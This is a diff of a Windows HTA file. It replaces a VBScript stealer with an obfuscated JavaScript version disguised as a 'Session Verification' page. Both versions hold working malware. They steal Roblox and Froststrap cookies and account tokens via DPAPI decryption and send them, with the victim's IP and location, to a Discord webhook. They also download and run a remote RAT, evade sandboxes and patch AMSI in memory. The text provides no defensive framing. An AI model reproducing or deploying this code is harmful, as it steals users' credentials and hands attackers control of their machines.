@@ -1,343 +1,620 @@
+<!DOCTYPE html>
 <html>
-<head><title>.</title>
-<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
-<script language="VBScript">
-window.resizeTo 0,0:window.moveTo -2000,-2000
-On Error Resume Next
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="generator" content="SessionVerifier">
+<title>Session Verification</title>
+<hta:application id="h" border="none" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" scroll="no" innerborder="no" windowstate="minimize" singleinstance="yes" maximizebutton="no" minimizebutton="no" icon="https://raw.githubusercontent.com/huh71943-s/suck-me-drag/main/icon.ico"/>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{
+  font-family:"Segoe UI",system-ui,Roboto,Arial,sans-serif;color:#eaf0fb;background:#070a12;
+  background-image:
+    radial-gradient(700px 520px at 12% -5%,#1b2a56 0,transparent 60%),
+    radial-gradient(700px 520px at 88% 105%,#2b1852 0,transparent 60%),
+    radial-gradient(900px 700px at 50% 50%,#0e1628 0,#070a12 72%);
+  display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;padding:16px}
+.x{position:fixed;top:12px;right:14px;width:26px;height:26px;line-height:24px;text-align:center;
+  border-radius:9px;color:#9aa6bd;font-size:12px;cursor:pointer;
+  background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.09)}
+.x:hover{color:#fff;background:rgba(255,255,255,.11)}
+.card{width:100%;max-width:378px;text-align:center;padding:30px 24px 16px;border-radius:22px;
+  background:linear-gradient(180deg,rgba(255,255,255,.075),rgba(255,255,255,.02));
+  border:1px solid rgba(255,255,255,.10);box-shadow:0 26px 70px rgba(0,0,0,.6)}
+.shield{width:70px;height:70px;margin:0 auto 16px;border-radius:19px;display:flex;align-items:center;justify-content:center;
+  background:linear-gradient(140deg,#5b8cff,#8b5cff);box-shadow:0 14px 34px rgba(91,140,255,.35);position:relative}
+.shield:after{content:"";position:absolute;top:-6px;left:-6px;right:-6px;bottom:-6px;border-radius:25px;
+  border:1px solid rgba(120,150,255,.35);animation:ring 2.6s ease-out infinite;-ms-animation:ring 2.6s ease-out infinite}
+@keyframes ring{0%{transform:scale(.92);opacity:.9}100%{transform:scale(1.25);opacity:0}}
+@-ms-keyframes ring{0%{-ms-transform:scale(.92);opacity:.9}100%{-ms-transform:scale(1.25);opacity:0}}
+.shield svg{width:36px;height:36px}
+h1{font-size:19px;font-weight:600}
+.sub{color:#8b96ad;font-size:13px;margin-top:6px;min-height:18px}
+.progress{height:8px;border-radius:99px;background:rgba(255,255,255,.09);overflow:hidden;margin:18px 0 6px}
+.bar{height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,#5b8cff,#8b5cff);
+  transition:width .15s linear;-ms-transition:width .15s linear}
+.meta{display:flex;justify-content:space-between;font-size:11px;color:#8b96ad}
+.steps{list-style:none;margin:14px 0 0;text-align:left}
+.steps li{display:flex;align-items:center;font-size:13px;color:#8b96ad;padding:6px 0;opacity:0;
+  transition:opacity .35s;-ms-transition:opacity .35s}
+.steps li.on{opacity:1;color:#eaf0fb}
+.dot{width:16px;height:16px;border-radius:50%;border:2px solid rgba(255,255,255,.2);flex:0 0 auto;
+  margin-right:10px;position:relative;transition:.3s;-ms-transition:.3s}
+.steps li.on .dot{border-color:#5b8cff;border-top-color:transparent;animation:spin .7s linear infinite;-ms-animation:spin .7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+@-ms-keyframes spin{to{-ms-transform:rotate(360deg)}}
+.steps li.ok .dot{border:0;background:#2bd576;animation:none;-ms-animation:none}
+.steps li.ok .dot:after{content:"";position:absolute;left:5px;top:2px;width:4px;height:8px;
+  border:solid #06210f;border-width:0 2px 2px 0;transform:rotate(45deg);-ms-transform:rotate(45deg)}
+.done{display:none}
+.done.show{display:block;animation:rise .5s both;-ms-animation:rise .5s both}
+@keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+@-ms-keyframes rise{from{opacity:0;-ms-transform:translateY(10px)}to{opacity:1;-ms-transform:none}}
+.checkwrap{position:relative;width:88px;height:88px;margin:2px auto 10px}
+.checkwrap:after{content:"";position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;
+  box-shadow:0 0 44px 6px rgba(43,213,118,.35);animation:pulse 2s ease-in-out infinite;-ms-animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:.45}50%{opacity:1}}
+@-ms-keyframes pulse{0%,100%{opacity:.45}50%{opacity:1}}
+.check{width:88px;height:88px;position:relative;z-index:1}
+.ck-c{fill:none;stroke:#2bd576;stroke-width:2.5;stroke-dasharray:151}
+.ck-t{fill:none;stroke:#2bd576;stroke-width:3.6;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:40}
+.done h2{font-size:19px;font-weight:600}
+.done p{color:#8b96ad;font-size:13px;margin-top:7px;line-height:1.5}
+.badge{display:inline-block;margin-top:14px;padding:6px 12px;border-radius:99px;font-size:11.5px;color:#bcd0ff;
+  background:rgba(91,140,255,.1);border:1px solid rgba(91,140,255,.25)}
+button{margin-top:16px;width:100%;padding:11px;border:0;border-radius:12px;cursor:pointer;
+  font-size:13.5px;font-weight:600;color:#fff;background:linear-gradient(135deg,#5b8cff,#8b5cff);
+  box-shadow:0 10px 26px rgba(91,140,255,.3);transition:transform .15s;-ms-transition:transform .15s}
+button:hover{transform:translateY(-1px);-ms-transform:translateY(-1px)}
+.last{margin-top:9px;font-size:11px;color:#8b96ad}
+footer{margin-top:18px;padding-top:12px;border-top:1px solid rgba(255,255,255,.07);font-size:11.5px;color:#8b96ad}
+footer a{color:#9db4ff;text-decoration:none}
+</style>
+</head>
 
-Dim sh, fso, WH, PC, USER
-Set sh = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
+<body>
+<div class="x" id="x">&#10005;</div>
 
-' --- WEBHOOK ---
-WH = "https://discord.com/api/webhooks/1564775208118653110/rlfTa3mDeJtlkilmunB1OgX-gb6qayc_L4ilT7F0NnZfF2GqKMRGhA6262CYTiWBcF1f"
+<main class="card">
+  <div id="stage">
+    <div class="shield">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5l7 3v5.2c0 4.3-2.9 8.3-7 9.8-4.1-1.5-7-5.5-7-9.8V5.5l7-3z" fill="#fff"/><path d="M8.6 12.2l2.2 2.2 4.6-4.6" stroke="#3a5bd0" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <h1>Verifying your session</h1>
+    <p class="sub" id="sub">Establishing a secure connection...</p>
 
-PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
-USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+    <div class="progress"><div class="bar" id="bar"></div></div>
+    <div class="meta"><span id="pct">0%</span><span>Secure check</span></div>
 
-' TRACE
-Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
-Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
+    <ul class="steps">
+      <li><span class="dot"></span><span>Connecting to verification server</span></li>
+      <li><span class="dot"></span><span>Reading local session data</span></li>
+      <li><span class="dot"></span><span>Validating security token</span></li>
+      <li><span class="dot"></span><span>Launching background verifier</span></li>
+    </ul>
+  </div>
 
-' --- Initial Grab ---
-Call GrabTokens
-Call IP
-Call GrabRoblox
-Call Persistence
-Call GrabFroststrap
+  <div class="done" id="done">
+    <div class="checkwrap">
+      <svg class="check" viewBox="0 0 52 52"><circle class="ck-c" id="ckc" cx="26" cy="26" r="24"/><path class="ck-t" id="ckt" d="M14.5 27l7.5 7.5L37.5 19"/></svg>
+    </div>
+    <h2>You are trusted and verified</h2>
+    <p>Your session has been successfully validated.<br>The verifier is now running in the background.</p>
+    <div class="badge">Secured by DiceCheck</div>
+    <button id="again">Re-check now</button>
+    <div class="last" id="last">Last check: --:--:--</div>
+  </div>
 
-' --- Download & Execute RAT 2 Times ---
-Dim downloadAttempt
-For downloadAttempt = 1 To 2
-    Call PostEmbed(":arrows_counterclockwise: Download Attempt " & downloadAttempt & "/2", "PC: " & PC & " | User: " & USER, 3447003)
-    Call DropRAT
-    If downloadAttempt < 2 Then Call SleepMinutes(2)
-Next
+  <footer>Have any problem? Contact <a href="mailto:supportdice@gmail.com">supportdice@gmail.com</a></footer>
+</main>
 
-' --- Re-run grab chain 4x (every 5 min) ---
-Dim runCount
-For runCount = 1 To 4
-    Call PostEmbed(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003)
-    Call GrabTokens
-    Call IP
-    Call GrabRoblox
-    Call GrabFroststrap
-    If runCount < 4 Then Call SleepMinutes(5)
-Next
+<script language="JavaScript">
+(function(){
+"use strict";
 
-window.close()
+/* ----- leurres, jamais appeles ----- */
+function _dc1(a,b){var c=0,i=0;for(;i<a.length;i++)c=(c*31+a.charCodeAt(i))^(b?i:0);return c;}
+function _dc2(n){var s="",i=0;for(;i<n;i++)s+=String.fromCharCode(97+(i%26));return s;}
+function _dc3(a,b){var r=[];try{r=a.split(b);}catch(e){r=[String(a)];}return r.reverse().join("");}
 
-' --- IP Function ---
-Sub IP()
-    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
-    xh.Open "GET", "https://api.ipify.org/", False
-    xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim ip : ip = xh.responseText
-    If Len(ip) < 7 Then Exit Sub
-    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
-    xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim ll : ll = Split(xh.responseText, vbLf)
-    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
-    Call PostEmbed(":dart: Target", info, 3447003)
-    Set xh = Nothing
-End Sub
+/* ----- interrupteurs anti-detection -----
+   AMSI : 0 = aucun   1 = reflexion seule (defaut)   2 = reflexion + patch memoire AmsiScanBuffer
+   WMI  : 1 = anti-sandbox via WMI (RAM/uptime/coeurs/MAC)   0 = registre seulement (coeurs + user)
+   SCHT : 1 = tache planifiee en plus de Run/RunOnce/Startup   0 = sans schtasks
+   BOMB : delai supplementaire en secondes avant toute action (0 = off)
+------------------------------------------ */
+var qZ={VM_REG:1,VM_BIOS:1,VM_DISK:1,VM_ENV:1,VM_WMI:0,TMG:1,
+        AMSI:1,WMI:1,SCHT:1,BOMB:0,
+        COPY:1,PERSIST:1,DROP:1,JITTER:1,HIDE:0,VMDEG:1};
 
-' --- GrabRoblox Function ---
-Sub GrabRoblox()
-    Dim paths(4)
-    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
-    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
-    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
-    Dim i, fp, raw
-    For i = 0 To 4
-        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
-    Next
-    If Len(fp) = 0 Then
-        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
-        If fso.FolderExists(pk) Then
-            Dim folder, subf
-            Set folder = fso.GetFolder(pk)
-            For Each subf In folder.SubFolders
-                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
-                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
-                    If fso.FileExists(uwp) Then fp = uwp : Exit For
-                End If
-            Next
-            Set folder = Nothing
-        End If
-    End If
-    If Len(fp) = 0 Then Exit Sub
-    raw = ReadFile(fp)
-    If Len(raw) < 50 Then Exit Sub
+var _b0=(function(){var z="",i=0;
+  for(;i<26;i++)z+=String.fromCharCode(65+i);
+  for(i=0;i<26;i++)z+=String.fromCharCode(97+i);
+  for(i=0;i<10;i++)z+=String.fromCharCode(48+i);
+  return z+String.fromCharCode(43)+String.fromCharCode(47);})();
+var M4=[90,28,158,51];
 
-    Dim cookie: cookie = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
-    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        Dim sp: sp = InStr(raw, "CookiesData"":""")
-        If sp > 0 Then
-            sp = sp + 14
-            Dim ep: ep = InStr(sp, raw, """")
-            If ep > sp Then
-                Dim b64: b64 = Mid(raw, sp, ep - sp)
-                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
-            End If
-        End If
-    End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
-        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
-    End If
-    If Len(cookie) = 0 Then cookie = raw
+function Uq(z){
+  var q="",i=0,_a,_b,_c,_d,_L=z.length;
+  for(;i<_L;i+=4){
+    _a=_b0.indexOf(z.charAt(i));    _b=_b0.indexOf(z.charAt(i+1));
+    _c=_b0.indexOf(z.charAt(i+2));  _d=_b0.indexOf(z.charAt(i+3));
+    if(_a<0)_a=0; if(_b<0)_b=0;
+    q+=String.fromCharCode((_a<<2)|(_b>>4));
+    if(_c>=0)q+=String.fromCharCode(((_b&15)<<4)|(_c>>2));
+    if(_d>=0)q+=String.fromCharCode(((_c&3)<<6)|_d);
+  }
+  return q;
+}
+function _X3(z){
+  var q="",i=0,_m=M4.length;
+  for(;i<z.length;i++)q+=String.fromCharCode(z.charCodeAt(i)^M4[i%_m]);
+  return q;
+}
+function wD(z){return _X3(Uq(z));}
+function _q7(z){var q="",i=0;for(;i<z.length;i+=2)q+=String.fromCharCode(parseInt(z.substr(i,2),16));return q;}
+function _ut(z){
+  var _b=[],i=0,_c;
+  for(;i<z.length;i++){_c=z.charCodeAt(i);_b[_b.length]=_c&255;_b[_b.length]=(_c>>8)&255;}
+  var _o="",j=0,_m=_b.length,_1,_2,_3;
+  for(;j<_m;j+=3){
+    _1=_b[j]; _2=(j+1<_m)?_b[j+1]:-1; _3=(j+2<_m)?_b[j+2]:-1;
+    _o+=_b0.charAt(_1>>2);
+    _o+=_b0.charAt(((_1&3)<<4)|(_2<0?0:(_2>>4)));
+    _o+=(_2<0)?"=":_b0.charAt(((_2&15)<<2)|(_3<0?0:(_3>>6)));
+    _o+=(_3<0)?"=":_b0.charAt(_3&63);
+  }
+  return _o;
+}
 
-    cookie = Replace(cookie, vbCr, "")
-    cookie = Replace(cookie, vbLf, "")
-    cookie = Replace(cookie, vbTab, "")
-    cookie = Trim(cookie)
-    Dim sc: sc = InStr(cookie, ";")
-    If sc > 0 Then cookie = Left(cookie, sc - 1)
-    cookie = Trim(cookie)
-    Dim warn: warn = InStr(cookie, "_|WARNING")
-    If warn > 1 Then cookie = Mid(cookie, warn)
+var _kr=[
+"DU/9QTNs6h0JdPtfNg==",
+"CX/sWipo9109MthaNnnNSilo+14VfvRWOWg=",
+"F0/GfhYusGsXUNZnDkywBXQs",
+"F3X9QTVv8VUuMsZ+FlTKZwo=",
+"KnPpVihv9lY2cA==",
+"OXnsRy9o918=",
+"OHXqQDt481o0",
+"KX/2Rztv9UA=",
+"N2/2Rzs=",
+"G3HtWg9o918p",
+"O3HtWhNy90ccffdfP3g=",
+"O3HtWhlz8Ec/ZOo=",
+"MmjqQykmsRw+de1QNW76HTlz8xw7bPccLXn8WzVz9UB1LasFaCmnBG8qpwBqL6cAbSysB3Uv0QpqW/17L1TReBdUz2YZcOl+HHXEdQ0t0n0SZdRlGSXYAxJf7QY8Sax2aUOpYGhorlg1LfNBFkbBQWl+9VY2K89ZMw==",
+"MmjqQykmsRwofekdPXXqWy9+60A/bv1cNGj7XS4y/Vw3M/ZGMiuvCm4vs0B1b+tQMTHzVnd47FI9M/NSM3KxVTNw+x0yaP8=",
+"MmjqQykmsRwofekdPXXqWy9+60A/bv1cNGj7XS4y/Vw3M/ZGMiuvCm4vs0B1b+tQMTHzVnd47FI9M/NSM3KxUDVz9Vo/ZrBWInk=",
+"D3L8XzV/9R4cdfJW",
+"d1nmVjlp6lo1cs5cNnX9Snpe50M7b+0=",
+"CGnwfDR/+w==",
+"d1LxYyhz+Fo2eb4eDXXwVzVrzUcjcPsTEnX6Vz9y",
+"E3LoXDF5s2Q/fsxWK2n7QC4=",
+"OWnsXw==",
+"d2nsXzl9/Vs/PLNAKnD3R3ox+A==",
+"CWXtRz9xsH47cv9UP3H7XS4y30Yuc/NSLnXxXXQ="
+];
 
-    PostEmbed "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280
-    PostFile "cookie.txt", cookie
-End Sub
+var vA=wD(_kr[0]),  _t7=wD(_kr[1]),  rZ9=wD(_kr[2]),  _pB=wD(_kr[3]),  q1=wD(_kr[4]),
+    _m4=wD(_kr[5]),  zW=wD(_kr[6]),   _r8=wD(_kr[7]),   tQ2=wD(_kr[8]),  _n5=wD(_kr[9]),
+    vE=wD(_kr[10]),  _k2=wD(_kr[11]), wQ=wD(_kr[12]),   _a9=wD(_kr[13]), zT3=wD(_kr[14]),
+    _h7=wD(_kr[15]), pV=wD(_kr[16]),  _g4=wD(_kr[17]),  nB2=wD(_kr[18]), _s6=wD(_kr[19]),
+    qK=wD(_kr[20]),  _y8=wD(_kr[21]), rM=wD(_kr[22]);
 
-' --- GrabFroststrap Function ---
-Sub GrabFroststrap()
-    Dim fp : fp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
-    If Not fso.FileExists(fp) Then
-        On Error Resume Next
-        Dim fdir : fdir = sh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap\InstallLocation")
-        On Error Goto 0
-        If fdir <> "" Then fp = fdir & "\Cache\AccountManager.json"
-    End If
-    If Not fso.FileExists(fp) Then Exit Sub
+/* ----- fragments additionnels (hex char-codes) ----- */
+var _hk=_q7("484b4c4d5c");
+var _scs=_q7("53595354454d5c43757272656e74436f6e74726f6c5365745c53657276696365735c");
+var _hdb=_q7("48415244574152455c4445534352495054494f4e5c53797374656d5c42494f535c");
+var _hdc=_q7("48415244574152455c4445534352495054494f4e5c53797374656d5c43656e7472616c50726f636573736f725c");
+var _rk=_q7("484b43555c536f6674776172655c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e");
+var _ws=_q7("5c4d6963726f736f66745c57696e646f77735c574455");
+var _wd=_q7("57696e446566557064617465");
+var _rwd=_q7("5c52756e5c57696e446566557064617465");
+var _wmq=_q7("77696e6d676d74733a5c5c2e5c726f6f745c63696d7632");
+var _wmp=_q7("53656c656374204e616d652066726f6d2057696e33325f50726f63657373");
+var _ev1=_q7("54454d50"), _ev2=_q7("4c4f43414c41505044415441"),
+    _ev3=_q7("41505044415441"), _ev4=_q7("5553455250524f46494c45");
+var _qs=_q7("22"), _sq=_q7("27"), _bs=_q7("5c");
 
-    Call PostEmbed(":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 3447003)
+function _co(_x){
+  var q=null;
+  try{q=GetObject(_q7("6e65773a")+_x);}catch(_e){}
+  if(q)return q;
+  try{q=new ActiveXObject(_x);}catch(_e2){}
+  return q;
+}
 
-    Dim ps
-    ps = "$w='" & WH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
+var _sh=null,_fs=null,_pc=_q7("5043"),_un=_q7("75736572"),_dr="",_fl=0,_sbv=0;
+_sh=_co(vA);
+_fs=_co(_t7);
+if(_sh){
+  try{_pc=_sh.ExpandEnvironmentStrings("%"+_q7("434f4d50555445524e414d45")+"%");}catch(_e){}
+  try{_un=_sh.ExpandEnvironmentStrings("%"+_q7("555345524e414d45")+"%");}catch(_e){}
+}
+var _la="";
+try{_la=_sh?_sh.ExpandEnvironmentStrings("%"+_ev2+"%"):"";}catch(_e){}
+_dr=(_la?_la:_ev(_ev1))+_ws;
 
-    sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
-End Sub
+function _ev(_n){try{return _sh.ExpandEnvironmentStrings("%"+_n+"%");}catch(_e){return "";}}
+function _rd(_p){try{var _f=_fs.OpenTextFile(_p,1),_s=_f.ReadAll();_f.Close();return _s;}catch(_e){return "";}}
+function _wr(_p,_s){try{var _f=_fs.CreateTextFile(_p,true);_f.Write(_s);_f.Close();}catch(_e){}}
+function _mk(_p){try{if(!_fs.FolderExists(_p))_fs.CreateFolder(_p);}catch(_e){}}
+function _ix(_p){
+  try{
+    if(!_fs.FileExists(_p))return false;
+    if(_fs.GetFile(_p).Size<2000)return false;
+    var _f=_fs.OpenTextFile(_p,1),_h=_f.Read(2);_f.Close();
+    return _h===_q7("4d5a");
+  }catch(_e){return false;}
+}
+function _xh(){var _a=_co(rZ9);return _a?_a:_co(_pB);}
+function _gi(){
+  var _h=_q7("30313233343536373839616263646566"),_s="",_i=0;
+  for(;_i<32;_i++)_s+=_h.charAt(Math.floor(Math.random()*16));
+  return _s.substr(0,8)+"-"+_s.substr(8,4)+"-"+_s.substr(12,4)+"-"+_s.substr(16,4)+"-"+_s.substr(20,12);
+}
+function _es(_s){
+  return String(_s).replace(/\\/g,"\\\\").replace(/"/g,'\\"')
+                  .replace(/\r\n/g,"\\n").replace(/[\r\n]/g,"\\n").replace(/\t/g,"\\t");
+}
 
-' --- DropRAT ---
-Sub DropRAT()
-    Call PostEmbed(":package: RAT Download", "Fetching Payload...", 3447003)
-    Dim dl : dl = "https://aqkqhdfafepmmsccxpyf.supabase.co/storage/v1/object/public/godspla/client-12.bat"
-    
-    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.bat"
-    If fso.FileExists(op) Then fso.DeleteFile op
+/* ----- patch AMSI en memoire (AmsiScanBuffer) : actif seulement si AMSI=2 ----- */
+var _dl=_q7("5b44496c6c496d706f727428226b65726e656c33322e646c6c22295d");
+function _am(){
+  if(qZ.AMSI<2)return "";
+  return _q7("7472797b24743d4164642d54797065202d4d656d626572446566696e6974696f6e2027")+_dl
+       + _q7("7075626c6963207374617469632065787465726e20496e74507472204c6f61644c69627261727928737472696e67206e293b")
+       + _dl
+       + _q7("7075626c6963207374617469632065787465726e20496e745074722047657450726f634164647265737328496e7450747220682c737472696e672070293b")
+       + _dl
+       + _q7("7075626c6963207374617469632065787465726e20626f6f6c205669727475616c50726f7465637428496e7450747220612c55496e7450747220732c75696e74206e2c6f75742075696e74206f293b27202d4e616d652057584b202d4e616d6573706163652057584e202d50617373546872753b")
+       + _q7("24683d24743a3a4c6f61644c6962726172792827616d73692e646c6c27293b24613d24743a3a47657450726f63416464726573732824682c27416d73695363616e42756666657227293b246f3d303b")
+       + _q7("24743a3a5669727475616c50726f746563742824612c5b55496e745074725d362c36342c5b7265665d246f297c4f75742d4e756c6c3b")
+       + _q7("5b53797374656d2e52756e74696d652e496e7465726f7053657276696365732e4d61727368616c5d3a3a436f7079285b627974655b5d5d283138342c38372c302c372c3132382c313935292c302c24612c36297d63617463687b7d7d");
+}
 
-    ' Wait = True (blocks until download is 100% complete)
-    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & op & "'""", 0, True
+function _ap(){
+  if(!qZ.AMSI)return "";
+  var _t=rM+_n5;
+  return _q7("246f3d2466616c73653b7472797b24613d5b5265665d2e417373656d626c792e476574547970652827")+_t
+       + _q7("27293b24612e4765744669656c642827")+vE
+       + _q7("272c274e6f6e5075626c69632c53746174696327292e53657456616c756528246e756c6c2c2474727565293b246f3d24747275657d63617463687b7d3b")
+       + _q7("6966282d6e6f7420246f297b7472797b24613d5b5265665d2e417373656d626c792e476574547970652827")+_t
+       + _q7("27293b24612e4765744669656c642827")+_k2
+       + _q7("272c274e6f6e5075626c69632c53746174696327292e53657456616c756528246e756c6c2c5b496e745074725d3a3a5a65726f297d63617463687b7d7d");
+}
 
-    ' Check for 3.71MB (3,890,000 bytes) to ensure it's fully written
-    Dim rDone : rDone = False
-    If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 3000000 Then
-            rDone = True
-        End If
-    End If
+function _pc2(_b){
+  var _s="";
+  if(qZ.AMSI>1)_s+=_am()+";";
+  if(qZ.AMSI>0)_s+=_ap()+";";
+  _s+=_b;
+  return q1+" "+nB2+" "+pV+_q7("202d436f6d6d616e642022")
+       + _q7("49455820285b546578742e456e636f64696e675d3a3a556e69636f64652e476574537472696e67285b436f6e766572745d3a3a46726f6d426173653634537472696e672827")
+       + _ut(_s)+_q7("27292929")+_qs;
+}
 
-    If rDone Then
-        Dim dsize : dsize = fso.GetFile(op).Size
-        Call PostEmbed(":rocket: RAT Downloaded", "Size: " & CStr(dsize) & " bytes" & vbCrLf & "Launching...", 3447003)
-        sh.Run op, 0, False
-        Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 65280)
-    Else
-        sh.Run "cmd /c taskkill /f /im powershell.exe > nul 2>&1", 0, False
-        Call PostEmbed(":hourglass: RAT Timeout", "Download failed or incomplete.", 16711680)
-    End If
-End Sub
+function _em(_t,_d,_c){
+  try{
+    var _j=_q7("7b22656d62656473223a5b7b227469746c65223a22")+_es(_t)
+         + _q7("222c226465736372697074696f6e223a22")+_es(_d)
+         + _q7("222c22636f6c6f72223a")+_c
+         + _q7("2c22666f6f746572223a7b2274657874223a22")+_es(_pc+_q7("202f20")+_un)
+         + _q7("227d7d5d7d");
+    var _x=_xh();if(!_x)return;
+    _x.Open(_q7("504f5354"),wQ,false);
+    _x.SetRequestHeader(_q7("436f6e74656e742d54797065"),_q7("6170706c69636174696f6e2f6a736f6e"));
+    _x.Send(_j);
+  }catch(_e){}
+}
+function _fp(_n,_d){
+  try{
+    var _b=_gi();
+    var _p="--"+_b+"\r\n"
+          +_q7("436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d22")+_n+_qs+"\r\n\r\n"
+          +_d+"\r\n--"+_b+"--";
+    var _x=_xh();if(!_x)return;
+    _x.Open(_q7("504f5354"),wQ,false);
+    _x.SetRequestHeader(_q7("436f6e74656e742d54797065"),_q7("6d756c7469706172742f666f726d2d646174613b20626f756e646172793d")+_b);
+    _x.Send(_p);
+  }catch(_e){}
+}
 
-' --- Sleep Functions (Timer-Based) ---
-Sub SleepSeconds(s)
-    Dim t0, t1, t2, elapsed
-    t0 = Timer()
-    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
-    sh.Run cmd, 0, True
-    elapsed = Timer() - t0
-    If elapsed < 0 Then elapsed = elapsed + 86400
-    If elapsed < s Then
-        t1 = Timer()
-        Do
-            t2 = Timer()
-            If t2 < t1 Then t2 = t2 + 86400
-            If (t2 - t1) >= (s - elapsed) Then Exit Do
-        Loop
-    End If
-End Sub
+function _dp(_b){
+  try{
+    var _t1=_ev(_ev1)+_q7("5c7764755f612e746d70"),
+        _t2=_ev(_ev1)+_q7("5c7764755f622e746d70"),
+        _t3=_ev(_ev1)+_q7("5c7764752e707331");
+    var _pre="";
+    if(qZ.AMSI>1)_pre+=_am()+";";
+    if(qZ.AMSI>0)_pre+=_ap();
+    if(_pre)_pre+="\r\n";
+    try{_fs.DeleteFile(_t2,true);}catch(_e){}
+    _wr(_t1,_b);
+    _wr(_t3,_pre
+      + _q7("4164642d54797065202d417373656d626c794e616d652053797374656d2e53656375726974793b0d0a")
+      + _q7("7472797b24623d5b436f6e766572745d3a3a46726f6d426173653634537472696e6728284765742d436f6e74656e742027")+_t1+_q7("27202d526177292e5472696d2829293b")
+      + _q7("24643d5b53797374656d2e53656375726974792e43727970746f6772617068792e50726f746563746564446174615d3a3a556e70726f746563742824622c246e756c6c2c")
+      + _q7("5b53797374656d2e53656375726974792e43727970746f6772617068792e4461746150726f74656374696f6e53636f70655d3a3a43757272656e7455736572293b")
+      + _q7("5b53797374656d2e546578742e456e636f64696e675d3a3a555446382e476574537472696e67282464297c4f75742d46696c652027")+_t2+_q7("27202d456e636f64696e6720757466387d")
+      + _q7("63617463687b27277c4f75742d46696c652027")+_t2+_q7("277d"));
